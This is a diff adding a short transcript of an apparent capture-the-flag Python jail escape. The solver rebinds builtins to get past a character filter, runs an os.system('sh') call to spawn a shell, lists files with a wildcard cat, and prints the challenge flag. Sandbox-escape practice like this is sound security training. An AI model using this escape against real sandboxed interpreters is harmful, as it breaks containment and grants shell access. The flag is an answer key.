@@ -1,0 +1,14 @@
+What characters would you like to use in your escape attempt?
+>>> any
+Enter your command
+>>> n=any
+What characters would you like to use in your escape attempt?
+>>> len
+Enter your command
+>>> len=n
+What characters would you like to use in your escape attempt?
+>>>
+Enter your command
+>>> import os;os.system('sh')
+cat f*
+ictf{it's_very_hard_to_keep_a_snake_in_prison}
